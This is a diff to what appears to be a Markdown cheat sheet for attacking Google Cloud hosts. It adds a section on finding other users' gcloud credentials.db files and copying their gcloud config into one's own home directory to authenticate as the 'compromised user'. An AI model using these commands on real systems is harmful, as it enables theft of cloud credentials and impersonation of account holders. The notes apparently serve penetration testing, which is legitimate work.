@@ -16,6 +16,21 @@
 gcloud beta compute ssh --zone "us-east1-b" "test-instance-1" --project "test-gcloud-project"
 ```
 
+## Getting credentials
+#### Look for Gcloud credentials
+- Gcloud stores creds in ~/.config/gcloud/credentials.db
+```
+sudo find /home -name "credentials.db
+```
+
+### Auth as compromised user
+- Copy gcloud dir to your own home directory to auth as the compromised user
+```bash
+sudo cp -r /home/username/.config/gcloud ~/.config
+sudo chown -R currentuser:currentuser ~/.config/gcloud
+gcloud auth list
+```
+
 ## Bucket access
 #### Check if user has default service account access
 - Look for the standard default service account name that look like: 
